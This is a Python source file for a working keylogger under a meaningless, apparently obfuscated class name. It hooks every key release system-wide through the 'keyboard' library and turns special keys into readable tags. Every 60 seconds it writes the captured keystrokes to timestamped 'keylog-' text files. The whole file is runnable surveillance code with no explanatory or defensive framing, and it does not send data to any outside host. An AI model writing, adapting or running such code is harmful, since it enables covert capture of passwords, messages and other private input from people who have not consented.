import keyboard
from threading import Timer
from datetime import datetime

SAVE_REPORT_EVERY_SECONDS = 60

class ajvns9a4w094:
    def __init__(self, interval, report_method="file"):

        self.interval = interval
        self.report_method = report_method
        self.report_file = "report.txt"
        self.report_file_path = "./" + self.report_file
        self.report_file_header = "Time,Key,Action\n"
        self.report_file_footer = "END"
        self.report_file_header_written = False
        self.report_file_footer_written = False
        
        self.log = ""

        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()

            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    ajvns9a4w094(interval=SAVE_REPORT_EVERY_SECONDS, report_method="file").start()
